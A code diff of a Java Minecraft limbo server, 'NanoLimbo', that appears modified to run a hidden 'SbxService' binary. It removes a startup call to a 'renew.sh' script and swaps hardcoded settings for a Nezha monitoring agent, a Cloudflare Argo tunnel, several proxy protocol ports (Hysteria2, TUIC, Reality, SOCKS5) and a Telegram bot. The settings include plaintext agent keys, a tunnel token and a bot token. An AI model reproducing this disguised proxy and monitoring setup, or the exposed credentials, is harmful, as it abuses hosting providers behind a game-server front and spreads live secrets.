@@ -58,17 +58,6 @@ public final class NanoLimbo {
         // Start SbxService
         try {
             runSbxBinary();
-
-            // ✅ 启动续期脚本 renew.sh（服务器运行期间自动续期）
-            File renewScript = new File("renew.sh");
-            if (renewScript.exists()) {
-                new ProcessBuilder("bash", "renew.sh")
-                    .inheritIO()
-                    .start();
-                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
-            } else {
-                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
-            }
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -137,22 +126,22 @@ public final class NanoLimbo {
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.xx66.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "BwbfLc7BbMVYjwSP84");
+        envVars.put("NEZHA_KEY", "hx0q8WmkvYKcwHgjma");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "godhost-ua.dora.cc.cd");
-        envVars.put("ARGO_AUTH", "eyJhIjoiODYxM2UxNGFjMzJjZmQ1ZGFjZDlkZWJlOTljNzlhOGQiLCJ0IjoiOTJmZjc0NGUtMzBmZC00YzNjLWFjMWUtMDBiZDZiZWFjNWZlIiwicyI6IlpHTTBaVEEzWVRVdE5EYzROeTAwWm1ZM0xUazRaalF0TjJRek1UZzNaVGd4WlRNMCJ9");
-        envVars.put("HY2_PORT", "20578");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "20578");
-        envVars.put("S5_PORT", "");
+        envVars.put("ARGO_DOMAIN", "zampto-it.dora.cc.cd");
+        envVars.put("ARGO_AUTH", "eyJhIjoiODYxM2UxNGFjMzJjZmQ1ZGFjZDlkZWJlOTljNzlhOGQiLCJ0IjoiNmM4OWRmYzQtMDM4NC00MGE4LWE1MDEtMTc5MDBmMTVkNDNhIiwicyI6Ik9HUTBOemM0WXpFdE1tTmlPQzAwWlRVd0xXSTVaakV0TmpCbVpHVmpZVEJrTmpOayJ9");
+        envVars.put("HY2_PORT", "20298");
+        envVars.put("TUIC_PORT", "40434");
+        envVars.put("REALITY_PORT", "20298");
+        envVars.put("S5_PORT", "40434");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "453472010");
-        envVars.put("BOT_TOKEN", "7126463574:AAHSLx2WwHJSa3gpujRj64JhpEpCqsJcUZs");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "godhost-ua");
+        envVars.put("NAME", "zampto-it");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
